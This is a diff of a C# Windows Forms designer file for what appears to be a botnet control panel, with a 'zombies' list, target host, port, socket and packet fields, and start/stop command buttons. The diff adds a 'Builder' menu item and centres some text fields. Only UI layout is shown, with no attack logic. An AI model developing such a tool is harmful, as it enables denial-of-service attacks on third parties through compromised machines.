@@ -30,6 +30,7 @@
         {
             this.menuStrip = new System.Windows.Forms.MenuStrip();
             this.btnFile = new System.Windows.Forms.ToolStripMenuItem();
+            this.btnBuilder = new System.Windows.Forms.ToolStripMenuItem();
             this.lstZombies = new System.Windows.Forms.ListView();
             this.columnHeader1 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.columnHeader2 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
@@ -53,7 +54,8 @@
             // menuStrip
             // 
             this.menuStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
-            this.btnFile});
+            this.btnFile,
+            this.btnBuilder});
             this.menuStrip.Location = new System.Drawing.Point(0, 0);
             this.menuStrip.Name = "menuStrip";
             this.menuStrip.Size = new System.Drawing.Size(411, 24);
@@ -65,6 +67,13 @@
             this.btnFile.Name = "btnFile";
             this.btnFile.Size = new System.Drawing.Size(37, 20);
             this.btnFile.Text = "File";
+            // 
+            // btnBuilder
+            // 
+            this.btnBuilder.Name = "btnBuilder";
+            this.btnBuilder.Size = new System.Drawing.Size(56, 20);
+            this.btnBuilder.Text = "Builder";
+            this.btnBuilder.Click += new System.EventHandler(this.btnBuilder_Click);
             // 
             // lstZombies
             // 
@@ -133,6 +142,7 @@
             this.txtHost.Size = new System.Drawing.Size(135, 20);
             this.txtHost.TabIndex = 5;
             this.txtHost.Text = "IP GOES HERE.";
+            this.txtHost.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
             // 
             // txtPort
             // 
@@ -142,6 +152,7 @@
             this.txtPort.Size = new System.Drawing.Size(58, 20);
             this.txtPort.TabIndex = 6;
             this.txtPort.Text = "80";
+            this.txtPort.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
             // 
             // label3
             // 
@@ -161,6 +172,7 @@
             this.txtSockets.Size = new System.Drawing.Size(58, 20);
             this.txtSockets.TabIndex = 8;
             this.txtSockets.Text = "30";
+            this.txtSockets.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
             // 
             // label4
             // 
@@ -204,6 +216,7 @@
             this.txtPackets.Size = new System.Drawing.Size(67, 20);
             this.txtPackets.TabIndex = 12;
             this.txtPackets.Text = "2000";
+            this.txtPackets.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
             // 
             // btnCommandStart
             // 
@@ -283,6 +296,7 @@
         private System.Windows.Forms.TextBox txtPackets;
         private System.Windows.Forms.Button btnCommandStart;
         private System.Windows.Forms.Button btnCommandStop;
+        private System.Windows.Forms.ToolStripMenuItem btnBuilder;
     }
 }
 
